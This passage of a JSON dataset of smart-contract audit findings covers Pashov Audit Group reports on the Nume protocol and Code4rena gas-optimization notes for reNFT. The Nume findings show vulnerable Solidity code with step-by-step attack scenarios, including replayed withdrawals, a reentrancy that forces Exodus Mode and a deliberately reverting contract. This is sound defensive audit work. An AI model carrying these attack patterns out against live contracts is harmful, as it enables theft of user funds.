exactly `msg.sender`. To prevent spamming.\nIf yes, `delete ns.userDepositCount[_user];` should be replaced with `delete ns.userDepositCount[msg.sender];`, because the counter for msg.sender is never nullified.",
      "summary": "\nThis bug report discusses a problem with a code that limits the number of deposits a user can make in a day. The code is supposed to delete the counter for the user and check if the user has exceeded the daily limit before allowing a deposit. However, the code only deletes the counter for the user, but checks and increments the counter for the sender, which can easily be changed and bypass the limit. The report recommends replacing the sender with the user in both deposit functions or changing the deletion to be for the sender instead of the user. The bug exists in two deposit contracts. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31636",
      "title": "[H-02] NFT Withdrawal request is not deleted after successful withdrawal",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High. Attacker can steal user's nfts.\n\n**Likelihood:** Medium. It requires re-deposit of NFT\n\n**Description**\n\nWithdrawal backend nft request is incorrectly deleted after performing withdrawal.\n\nHere you can see that delete is performed on memory array instead of storage:\n\n```solidity\n    function withdrawNFT(\n        address _user,\n        address _nftContractAddress,\n        uint256 _tokenId,\n        bool _mintedNft,\n        uint256 _queueIndex,\n        bool _isContractWithdrawal\n    ) external nonReentrant {\n        AppStorage.enforceExodusMode();\n\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n\n        bytes32 queueItem = keccak256(\n            abi.encodePacked(_user, _nftContractAddress, _tokenId, _mintedNft)\n        );\n\n        if (_isContractWithdrawal) {\n            ...\n        } else {\n@>          bytes[] memory userBackendNftWithdrawalRequests = ns\n                .userBackendNftWithdrawalRequests[_user];\n            require(\n                _queueIndex <= userBackendNftWithdrawalRequests.length,\n                \"NFTWithdrawalsFacet: Invalid queue index\"\n            );\n            (\n                address user,\n                address nftContractAddress,\n                uint256 tokenId,\n                bool mintedNft\n            ) = abi.decode(\n                    userBackendNftWithdrawalRequests[_queueIndex - 1],\n                    (address, address, uint256, bool)\n                );\n            PaymentUtils.payNft(user, nftContractAddress, tokenId, mintedNft);\n@>          delete userBackendNftWithdrawalRequests[_queueIndex - 1];\n        }\n\n        emit NFTWithdrawn(_user, _nftContractAddress, _tokenId, _mintedNft);\n    }\n```\n\nIt means actually user's withdrawal request is not deleted after withdrawal. It allows user to withdraw the same nft multiple times.\nSuppose following scenario:\n\n1. User1 deposits NFT.\n2. User1 withdraws NFT via `withdrawNFT()`. His request is still.\n3. User1 sells NFT to User2.\n4. User2 deposits NFT. But now User1 has ability withdraw it.\n\n**Recommendations**\n\n```diff\n    function withdrawNFT(\n        address _user,\n        address _nftContractAddress,\n        uint256 _tokenId,\n        bool _mintedNft,\n        uint256 _queueIndex,\n        bool _isContractWithdrawal\n    ) external nonReentrant {\n        ...\n\n        if (_isContractWithdrawal) {\n            ...\n        } else {\n            bytes[] memory userBackendNftWithdrawalRequests = ns\n                .userBackendNftWithdrawalRequests[_user];\n            require(\n                _queueIndex <= userBackendNftWithdrawalRequests.length,\n                \"NFTWithdrawalsFacet: Invalid queue index\"\n            );\n            ...\n            PaymentUtils.payNft(user, nftContractAddress, tokenId, mintedNft);\n-           delete userBackendNftWithdrawalRequests[_queueIndex - 1];\n+           delete ns.userBackendNftWithdrawalRequests[_user][_queueIndex - 1];\n        }\n\n        emit NFTWithdrawn(_user, _nftContractAddress, _tokenId, _mintedNft);\n    }\n```",
      "summary": "\nThis bug report discusses an issue with the withdrawal process for NFTs (non-fungible tokens) on a platform. The severity of the bug is high as it can lead to attackers stealing users' NFTs. The likelihood of the bug occurring is medium, as it requires the user to re-deposit their NFT. \n\nThe bug occurs because the withdrawal request for NFTs is not properly deleted after the withdrawal is performed. This means that a user can withdraw the same NFT multiple times, even after selling it to someone else. \n\nTo fix this issue, the report recommends making a small change to the code. Instead of deleting the user's request from a memory array, it should be deleted from a storage array. This ensures that the withdrawal request is properly deleted and cannot be used again by the user. \n\nIn summary, this bug report highlights the importance of properly deleting withdrawal requests to prevent attackers from stealing NFTs. It also provides a simple solution to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31635",
      "title": "[H-01] User can repeat calling `withdrawExodus()` to steal all tokens",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High. Any user can steal all funds.\n\n**Likelihood:** Medium. Exodus Mode must be enabled.\n\n**Description**\n\nFunction `withdrawExodus()` is used to withdraw funds deposited to Nume when protocol enters Exodus Mode, i.e. when operator doesn't perform bridging from Nume to Polygon.\n\nThis function only verifies that user had token balance prior to the last settlement. If yes - transfers requested tokens to user. However nothing stops user from replaying call to `withdrawExodus()`.\n\n```solidity\n    function withdrawExodus(\n        WithdrawalRequestArgs calldata _args\n    ) external nonReentrant {\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n        if (!ns.isInExodusMode) {\n            revert AppStorage.NotInExodusMode();\n        }\n        require(\n            ECDSAUtils.recoverSigner(\n                abi.encodePacked(_args.user, ns.currBlockNumber),\n                _args.signature\n            ) == _args.user,\n            \"WithdrawExodus: Invalid user signature\"\n        );\n\n        VerifyUserUtils.verifyUser(...);\n\n        if (_args.isNft) {\n            PaymentUtils.payNft(\n                _args.user,\n                _args.tokenAddress,\n                _args.balanceOrTokenId,\n                _args.mintedNft\n            );\n        } else {\n            require(\n                _args.balanceOrTokenId > 0,\n                \"WithdrawalsFacet: Invalid balance\"\n            );\n            PaymentUtils.pay(\n                _args.user,\n                _args.tokenAddress,\n                _args.balanceOrTokenId\n            );\n        }\n        ...\n    }\n```\n\nSuppose following scenario:\n\n1. User deposited 300 USDC\n2. Nume enters Exodus Mode\n3. Now user can perform infinite withdraws of his 300 USDC\n\n**Recommendations**\n\nKeep track of withdrawn amounts in `withdrawExodus()`. For example introduce internal `mapping (address token => uint256 withdrawnAmount)`",
      "summary": "\nThe report describes a bug in a function called `withdrawExodus()` which is used to withdraw funds from a platform called Nume. This bug allows any user to steal all funds deposited to Nume when the protocol enters Exodus Mode. This mode is enabled when the operator does not perform a bridging process from Nume to Polygon. The bug is caused by the function only checking if the user had a token balance prior to the last settlement, but it does not prevent the user from replaying the call to the function. This means that a user who deposited 300 USDC can withdraw an infinite amount of USDC when Nume is in Exodus Mode. To fix this bug, the report recommends keeping track of the withdrawn amounts in the function and introducing a mapping to track the withdrawn amounts for each token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31634",
      "title": "[C-02] Attacker can turn on Exodus Mode",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High. Protocol stops operating.\n\n**Likelihood:** High. Nothing stops from performing this attack.\n\n**Description**\n\nAttacker can reenter Nume when `Witdrawal_Stake` is returned on settlement notarization, and in `fallback()` call `challengeUserWithdrawal()` to activate Exodus Mode.\n\n`notarizeSettlement()` processes withdrawals submitted on-chain, such on-chain submissions require `Withdrawal_stake` which is returned on successful withdrawal. Note that it firstly deletes timestamp of that `withdrawalRequest`, but updates `ns.lastFinalizedWithdrawalsQueueIndex` in the very end after all withdrawals:\n\n```solidity\n            for (uint256 i; i < numContractWithdrawals; ) {\n                ...\n                delete ns.withdrawalRequests[\n                    _args.contractWithdrawalAddresses[i]\n                ][_args.contractWithdrawalTokenAddresses[i]];\n                delete ns.withdrawalRequestTimestamps[\n@>                  ns.lastFinalizedWithdrawalsQueueIndex + i + 1\n                ];\n                if (_args.contractWithdrawalAmounts[i] > 0) {\n                    PaymentUtils.pay(\n                        _args.contractWithdrawalAddresses[i],\n                        _args.contractWithdrawalTokenAddresses[i],\n                        _args.contractWithdrawalAmounts[i]\n                    );\n                    PaymentUtils.pay(\n                        _args.contractWithdrawalAddresses[i],\n                        0x1111111111111111111111111111111111111111,\n                        ns.WITHDRAWAL_STAKE\n                    );\n                }\n                ...\n            }\n            ...\n@>          ns.lastFinalizedWithdrawalsQueueIndex = _args\n                .handledWithdrawalsQueueIndex;\n```\n\nIt introduces attack vector:\n\n1. Attacker creates Malicious contract, which in `fallback()` calls `WithdrawalsFacet.challengeUserWithdrawal()`\n2. Attacker on-chain submits withdrawal to that malicious contract\n3. Operator calls `notarizeSettlement()` and processes withdrawals\n4. `Withdrawal_Stake` is transferred to that Malicious contracts and function `challengeUserWithdrawal()` is called\n\nNow let's have a look on `challengeUserWithdrawal()`. 1) As you remember, `ns.lastFinalizedWithdrawalsQueueIndex` is updated in the very end, therefore current `queueIndex` is not finalized. 2) Timestamp was cleared before transferring assets. As a result, all requires are passed and protocol enters Exodus Mode\n\n```solidity\n    function challengeUserWithdrawal(\n        uint256 _queueIndex,\n        bool _isNft\n    ) external {\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n\n        if (_isNft) {\n            ... // Skipped because scenario describes ERC20 withdrawal\n        } else {\n            require(\n                _queueIndex <= ns.currWithdrawalsQueueIndex &&\n@>                  _queueIndex > ns.lastFinalizedWithdrawalsQueueIndex,\n                \"WithdrawalsFacet: Invalid queue index\"\n            );\n            require(\n                block.timestamp >\n@>                  ns.withdrawalRequestTimestamps[_queueIndex] +\n                        ns.WITHDRAWAL_REQUEST_TIMEOUT,\n                \"WithdrawalsFacet: Withdrawal request has not expired yet\"\n            );\n        }\n\n        ns.isInExodusMode = true;\n        emit ExodusModeEntered(_queueIndex, _isNft);\n    }\n```\n\n**Recommendations**\n\nAdd `nonReentrant` modifier on all external functions of Nume.",
      "summary": "\nThe report is about a bug in the Nume protocol that can be triggered by an attacker. This bug causes the protocol to stop working and can be easily exploited by the attacker. The bug is caused by a flaw in the code that handles withdrawals. The attacker can create a malicious contract and use it to call a function in the Nume protocol. When the protocol processes withdrawals, the attacker's contract receives a stake and activates a function that puts the protocol in \"Exodus Mode\". This mode causes the protocol to stop functioning properly. To fix this bug, the report recommends adding a modifier to prevent reentrancy in all external functions of Nume.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31633",
      "title": "[C-01] Attack to force the project into the exodusMode",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High, disabled core project functions forever\n\n**Likelihood:** High, easy to execute by anyone\n\n**Description**\n\nThe attack flow:\n\n1. Deposit ETH from a malicious smart contract A, which reverts when receiving ETH\n2. Await for the deposit settlement to Nume network\n3. call `submitWithdrawalRequest()`\n4. the owner has 14 days to withdraw via `notarizeSettlement()`\n5. the owner tries to settle the withdrawal but it fails - a malicious smart contract A intentionally reverts not receiving ETH\n6. The attacker waits 14 days\n7. The attacker calls `challengeUserWithdrawal()` => `ns.isInExodusMode = true;`\n\nAs a result, the check `enforceExodusMode` will not pass in core Nume functions - enabling a Mass exit scenario for the project, which means no new deposits and force withdrawals enabled (with no withdrawal requests on Nume).\nAlso, there is no way to set `isInExodusMode` back to false.\n(Actually, it exists - urgently develop a new facet with the new code, deploy, and run the fix)\nThe same issue can happen with ERC20 tokens with blacklists, for example `USDC`.\n\nAnother attacker vector with the same principle - avoid the deposit being invalidated.\nIf an ETH deposit by a user is tagged as invalid (during `notarizeSettlement`), Nume pays back the deposit.\nIf such a malicious deposit is among valid deposits - there will be no way to remove it, thus it will be a problem to process valid deposits.\nSo the owner will have to treat such a deposit as valid.\n\n**Recommendations**\n\nIt is better to let users withdraw their ETH by themselves, in a separate function.\nInstead of transferring funds directly, the function can increment a mapping like `user=>token=>amount`. Then, users have to call the function to withdraw this \"balance\".\nAlso, consider introducing some instruments to disable `exoduceMode`.",
      "summary": "\nThis bug report describes a serious issue in a project that can cause core functions to be disabled permanently. It is easy to execute and can affect anyone. The attack involves depositing ETH from a malicious smart contract, waiting for the deposit to settle, and then calling a specific function. This triggers a 14-day period during which the owner can withdraw the funds, but if they fail to do so, the attacker can activate a \"mass exit\" scenario that prevents new deposits and forces withdrawals. Additionally, there is no way to reverse this setting back to normal. The same issue can also occur with ERC20 tokens that have blacklists. The report recommends implementing a separate function for users to withdraw their funds and introducing measures to prevent this type of attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "30558",
      "title": "[G-08]  State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variables.\n\n### 5 Instances\n\n1. ### Refactor `Admin.requestPermissions()`  to avoid 6 `SLOAD(Gwarmaccess)`\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L74-#L81\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L83-#L86\n\nWe can reduce the gas cost of the `requestPermissions()` function by reducing the number of storage reads (`SLOAD`) for the state variables `STORE` and `ESCRW`. The value of the `STORE` and `ESCRW` state variables should be cached stack variables then the stack variables be used for subsequent reads of the `STORE` and `ESCRW` state variable. In implementing this we replace 6 `SLOAD`s(cold acess) `100` gas units with  much cheaper 6 `MLOAD` `18` gas units: The diff below shows how the code could be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Admin.sol\n\n64:    function requestPermissions()\n65:        external\n66:        view\n67:        override\n68:        onlyKernel\n69:        returns (Permissions[] memory requests)\n70:    {\n71:        requests = new Permissions[](8);\n72:        requests[0] = Permissions(\n73:            toKeycode(\"STORE\"),\n74:            STORE.toggleWhitelistExtension.selector  //@audit STORE 1st SLOAD\n75:        );\n76:        requests[1] = Permissions(\n77:            toKeycode(\"STORE\"),\n78:            STORE.toggleWhitelistDelegate.selector  //@audit STORE 2nd SLOAD\n79:        );\n80:        requests[2] = Permissions(toKeycode(\"STORE\"), STORE.upgrade.selector);  //@audit STORE 3rd SLOAD\n81:        requests[3] = Permissions(toKeycode(\"STORE\"), STORE.freeze.selector);  //@audit STORE 4th SLOAD\n82:\n83:        requests[4] = Permissions(toKeycode(\"ESCRW\"), ESCRW.skim.selector);  //@audit ESCRW 1st SLOAD\n84:        requests[5] = Permissions(toKeycode(\"ESCRW\"), ESCRW.setFee.selector);  //@audit ESCRW 2nd SLOAD\n85:        requests[6] = Permissions(toKeycode(\"ESCRW\"), ESCRW.upgrade.selector);  //@audit ESCRW 3rd SLOAD\n86:        requests[7] = Permissions(toKeycode(\"ESCRW\"), ESCRW.freeze.selector);  //@audit ESCRW 4th SLOAD\n87:    }\n```\n```diff\ndiff --git a/src/policies/Admin.sol b/src/policies/Admin.sol\nindex b37d47f..4e277f7 100644\n--- a/src/policies/Admin.sol\n+++ b/src/policies/Admin.sol\n@@ -69,21 +69,23 @@ contract Admin is Policy {\n         returns (Permissions[] memory requests)\n     {\n         requests = new Permissions[](8);\n+        Storage _store = STORE;\n+        PaymentEscrow _escrw = ESCRW;\n         requests[0] = Permissions(\n             toKeycode(\"STORE\"),\n-            STORE.toggleWhitelistExtension.selector\n+            _store.toggleWhitelistExtension.selector\n         );\n         requests[1] = Permissions(\n             toKeycode(\"STORE\"),\n-            STORE.toggleWhitelistDelegate.selector\n+            _store.toggleWhitelistDelegate.selector\n         );\n-        requests[2] = Permissions(toKeycode(\"STORE\"), STORE.upgrade.selector);\n-        requests[3] = Permissions(toKeycode(\"STORE\"), STORE.freeze.selector);\n+        requests[2] = Permissions(toKeycode(\"STORE\"), _store.upgrade.selector);\n+        requests[3] = Permissions(toKeycode(\"STORE\"), _store.freeze.selector);\n\n-        requests[4] = Permissions(toKeycode(\"ESCRW\"), ESCRW.skim.selector);\n-        requests[5] = Permissions(toKeycode(\"ESCRW\"), ESCRW.setFee.selector);\n-        requests[6] = Permissions(toKeycode(\"ESCRW\"), ESCRW.upgrade.selector);\n-        requests[7] = Permissions(toKeycode(\"ESCRW\"), ESCRW.freeze.selector);\n+        requests[4] = Permissions(toKeycode(\"ESCRW\"), _escrw.skim.selector);\n+        requests[5] = Permissions(toKeycode(\"ESCRW\"), _escrw.setFee.selector);\n+        requests[6] = Permissions(toKeycode(\"ESCRW\"), _escrw.upgrade.selector);\n+        requests[7] = Permissions(toKeycode(\"ESCRW\"), _escrw.freeze.selector);\n     }\n```\n```\nEstimated gas saved: 582 gas units\n```\n\n</details>\n\n2. ### Refactor `Factory.deployRentalSafe()`  to avoid 1 `SLOAD(Gwarmaccess)`\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L189\n\nWe can reduce the gas cost of the `deployRentalSafe()` function by reducing the number of storage reads (`SLOAD`) for the state variable `STORE`. The value of the `STORE` state variable should be cached in a stack variable then the stack variable be used for subsequent reads of the `STORE` state variable. In implementing this we replace 1 `SLOAD`s(cold acess) `100` gas units with  much cheaper 1 `MLOAD` `3` gas units: The diff below shows how the code could be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Factory.sol\n\n138:    function deployRentalSafe(\n139:        address[] calldata owners,\n140:        uint256 threshold\n141:    ) external returns (address safe) {\n142:        // Require that the threshold is valid.\n143:        if (threshold == 0 || threshold > owners.length) {\n144:            revert Errors.FactoryPolicy_InvalidSafeThreshold(threshold, owners.length);\n145:        }\n.\n.\n.\n180:        safe = address(\n181:            safeProxyFactory.createProxyWithNonce(\n182:                address(safeSingleton),\n183:                initializerPayload,\n184:                uint256(keccak256(abi.encode(STORE.totalSafes() + 1, block.chainid)))  //@audit STORE 1st SLOAD\n185:            )\n186:        );\n187:\n188:        // Store the deployed safe.\n189:        STORE.addRentalSafe(safe);  //@audit STORE 2nd SLOAD\n190:\n191:        // Emit the event.\n192:        emit Events.RentalSafeDeployment(safe, owners, threshold);\n193:    }\n```\n```diff\ndiff --git a/src/policies/Factory.sol b/src/policies/Factory.sol\nindex 8401ad7..f019f3c 100644\n--- a/src/policies/Factory.sol\n+++ b/src/policies/Factory.sol\n@@ -174,6 +174,7 @@ contract Factory is Policy {\n             )\n         );\n\n+        Storage _store = STORE;\n         // Deploy a safe proxy using initializer values for the Safe.setup() call\n         // with a salt nonce that is unique to each chain to guarantee cross-chain\n         // unique safe addresses.\n@@ -181,12 +182,12 @@ contract Factory is Policy {\n             safeProxyFactory.createProxyWithNonce(\n                 address(safeSingleton),\n                 initializerPayload,\n-                uint256(keccak256(abi.encode(STORE.totalSafes() + 1, block.chainid)))\n+                uint256(keccak256(abi.encode(_store.totalSafes() + 1, block.chainid)))\n             )\n         );\n\n         // Store the deployed safe.\n-        STORE.addRentalSafe(safe);\n+        _store.addRentalSafe(safe);\n\n         // Emit the event.\n         emit Events.RentalSafeDeployment(safe, owners, threshold);\n```\n```\nEstimated gas saved: 97\n```\n\n</details>\n\n3. ### Refactor `Guard.requestPermissions()`  to avoid 1 `SLOAD(Gwarmaccess)`\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L93\n\nWe can reduce the gas cost of the `requestPermissions()` function by reducing the number of storage reads (`SLOAD`) for the state variable `STORE`. The value of the `STORE` state variable should be cached in a stack variable then the stack variable be used for subsequent reads of the `STORE` state variable. In implementing this we replace 1 `SLOAD`s(cold acess) `100` gas units with  much cheaper 1 `MLOAD` `3` gas units: The diff below shows how the code could be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Guard.sol\n\n84:    function requestPermissions()\n85:        external\n86:        view\n87:        override\n88:        onlyKernel\n89:        returns (Permissions[] memory requests)\n90:    {\n91:        requests = new Permissions[](2);\n92:        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.updateHookPath.selector);  //@audit STORE 1st SLOAD\n93:        requests[1] = Permissions(toKeycode(\"STORE\"), STORE.updateHookStatus.selector);  //@audit STORE 2nd SLOAD\n94:    }\n```\n\n```diff\ndiff --git a/src/policies/Guard.sol b/src/policies/Guard.sol\nindex a0a565a..053e45e 100644\n--- a/src/policies/Guard.sol\n+++ b/src/policies/Guard.sol\n@@ -88,9 +88,10 @@ contract Guard is Policy, BaseGuard {\n         onlyKernel\n         returns (Permissions[] memory requests)\n     {\n+        Storage _store = STORE;\n         requests = new Permissions[](2);\n-        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.updateHookPath.selector);\n-        requests[1] = Permissions(toKeycode(\"STORE\"), STORE.updateHookStatus.selector);\n+        requests[0] = Permissions(toKeycode(\"STORE\"), _store.updateHookPath.selector);\n+        requests[1] = Permissions(toKeycode(\"STORE\"), _store.updateHookStatus.selector);\n     }\n\n     /////////////////////////////////////////////////////////////////////////////////\n```\n```\nEstimated gas saved: 97 gas units\n```\n</details\n\n4. ### Refactor `Guard.checkTransaction()`  to avoid 2 `SLOAD(Gwarmaccess)`\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L335\n\nWe can reduce the gas cost of the `checkTransaction()` function by reducing the number of storage reads (`SLOAD`) for the state variable `STORE`. The value of the `STORE` state variable should be cached in a stack variable then the stack variable be used for subsequent reads of the `STORE` state variable. In implementing this we replace 2 `SLOAD`s(cold acess) `200` gas units with  much cheaper 2 `MLOAD` `6` gas units: The diff below shows how the code could be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Guard.sol\n\n309:    function checkTransaction(\n310:        address to,\n311:        uint256 value,\n312:        bytes memory data,\n313:        Enum.Operation operation,\n314:        uint256,\n315:        uint256,\n316:        uint256,\n317:        address,\n318:       address payable,\n319:        bytes memory,\n320:        address\n321:    ) external override {\n322:        // Disallow transactions that use delegate call, unless explicitly\n323:        // permitted by the protocol.\n324:        if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {  //@audit STORE 1st SLOAD\n325:            revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);\n326:        }\n327:\n328:        // Require that a function selector exists.\n329:        if (data.length < 4) {\n330:            revert Errors.GuardPolicy_FunctionSelectorRequired();\n331:        }\n332:\n333:        // Fetch the hook to interact with for this transaction.\n334:        address hook = STORE.contractToHook(to);  //@audit STORE 2nd SLOAD\n335:        bool isActive = STORE.hookOnTransaction(hook);  //@audit STORE 3rd SLOAD\n.\n.\n.\n345:    }\n```\n\n```diff\ndiff --git a/src/policies/Guard.sol b/src/policies/Guard.sol\nindex a0a565a..c24619f 100644\n--- a/src/policies/Guard.sol\n+++ b/src/policies/Guard.sol\n@@ -319,9 +319,11 @@ contract Guard is Policy, BaseGuard {\n         bytes memory,\n         address\n     ) external override {\n+\n+        Storage _store = STORE;\n         // Disallow transactions that use delegate call, unless explicitly\n         // permitted by the protocol.\n-        if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {\n+        if (operation == Enum.Operation.DelegateCall && !_store.whitelistedDelegates(to)) {\n             revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);\n         }\n\n@@ -331,8 +333,8 @@ contract Guard is Policy, BaseGuard {\n         }\n\n         // Fetch the hook to interact with for this transaction.\n-        address hook = STORE.contractToHook(to);\n-        bool isActive = STORE.hookOnTransaction(hook);\n+        address hook = _store.contractToHook(to);\n+        bool isActive = _store.hookOnTransaction(hook);\n\n         // If a hook exists and is enabled, forward the control flow to the hook.\n         if (hook != address(0) && isActive) {\n```\n```\nEstimated gas saved: 194 gas units saved\n```\n</details>\n\n\n5. ### Refactor `Stop.requestPermissions()`  to avoid 2 `SLOAD(Gwarmaccess)`\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L96\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L98\n\nWe can reduce the gas cost of the `requestPermissions()` function by reducing the number of storage reads (`SLOAD`) for the state variables `STORE` and `ESCRW`. The value of the `STORE` and `ESCRW` state variables should be cached stack variables then the stack variables be used for subsequent reads of the `STORE` and `ESCRW` state variable. In implementing this we replace 2 `SLOAD`s(cold acess) `200` gas units with  much cheaper 2 `MLOAD` `6` gas units: The diff below shows how the code could be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Stop.sol\n\n87:    function requestPermissions()\n88:        external\n89:        view\n90:        override\n91:        onlyKernel\n92:        returns (Permissions[] memory requests)\n93:    {\n94:        requests = new Permissions[](4);\n95:        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.removeRentals.selector);  //@audit STORE 1st SLOAD\n96:        requests[1] = Permissions(toKeycode(\"STORE\"), STORE.removeRentalsBatch.selector);  //@audit STORE 2nd SLOAD\n97:        requests[2] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePayment.selector);  //@audit ESCRW 1st SLOAD\n98:        requests[3] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePaymentBatch.selector);  //@audit ESCRW 2nd SLOAD\n99:    }\n```\n\n```diff\ndiff --git a/src/policies/Stop.sol b/src/policies/Stop.sol\nindex ab240ba..ad7cee5 100644\n--- a/src/policies/Stop.sol\n+++ b/src/policies/Stop.sol\n@@ -92,10 +92,13 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {\n         returns (Permissions[] memory requests)\n     {\n         requests = new Permissions[](4);\n-        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.removeRentals.selector);\n-        requests[1] = Permissions(toKeycode(\"STORE\"), STORE.removeRentalsBatch.selector);\n-        requests[2] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePayment.selector);\n-        requests[3] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePaymentBatch.selector);\n+        Storage _store = STORE;\n+        PaymentEscrow _escrw = ESCRW;\n+\n+        requests[0] = Permissions(toKeycode(\"STORE\"), _store.removeRentals.selector);\n+        requests[1] = Permissions(toKeycode(\"STORE\"), _store.removeRentalsBatch.selector);\n+        requests[2] = Permissions(toKeycode(\"ESCRW\"), _escrw.settlePayment.selector);\n+        requests[3] = Permissions(toKeycode(\"ESCRW\"), _escrw.settlePaymentBatch.selector);\n     }\n```\n```\nEstimated gas saved: 194 gas units\n```\n\n</details>\n\n## Conclusion\nAs you embark on incorporating the recommended optimizations, we want to emphasize the utmost importance of proceeding with vigilance and dedicating thorough efforts to comprehensive testing. It is of paramount significance to ensure that the proposed alterations do not inadvertently introduce fresh vulnerabilities, while also successfully achieving the anticipated enhancements in performance.\n\nWe strongly advise conducting a meticulous and exhaustive evaluation of the modifications made to the codebase. This rigorous scrutiny and exhaustive assessment will play a pivotal role in affirming both the security and efficacy of the refactored code. Your careful attention to detail, coupled with the implementation of a robust testing framework, will provide the necessary assurance that the refined code aligns with your security objectives and effectively fulfills the intended performance optimizations.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/560#issuecomment-1910731385)**\n\n***\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30557",
      "title": "[G-07] Multiple accesses of a array should use a local variable cache",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a value inside an array, within a function. Caching an array's struct avoids re-calculating the array offsets into memory\n\n### Proof of concept\n\n<Details>\n\n```solidity\nstruct Person {\n    string name;\n    uint age;\n    uint id;\n}\n\ncontract NoCacheArrayElement {\n\n    Person[] students;\n\n    function createStudents() external  {\n        Person[] memory arrayOfPersons = new Person[](3); \n        Person memory newPerson1 = Person(\"Emmanuel\", 15,1);\n        Person memory newPerson2 = Person(\"Faustina\", 16,2);\n        Person memory newPerson3 = Person(\"Emmanuela\", 14,3);\n\n        arrayOfPersons[0] = newPerson1;\n        arrayOfPersons[1] = newPerson2;\n        arrayOfPersons[2] = newPerson3;\n\n        _addNewSet(arrayOfPersons);\n    }\n\n    function _addNewSet(Person[] memory _persons) internal {\n        uint len = _persons.length;\n        unchecked {\n            for(uint i; i < len; ++i) {\n                Person memory newStudent = Person(_persons[i].name, _persons[i].age, _persons[i].id);\n                students.push(newStudent);\n            }\n        }\n\n    }\n}\n```\n```\ntest for test/NoCacheArrayElement.t.sol:NoCacheArrayElementTest\n[PASS] test_createStudents() (gas: 230357)\n```\n\n```solidity\n\nstruct Person {\n    string name;\n    uint age;\n    uint id;\n}\n\ncontract CacheArrayElement {\n\n    Person[] students;\n\n    function createStudents() external  {\n        Person[] memory arrayOfPersons = new Person[](3); \n        Person memory newPerson1 = Person(\"Emmanuel\", 15,1);\n        Person memory newPerson2 = Person(\"Faustina\", 16,2);\n        Person memory newPerson3 = 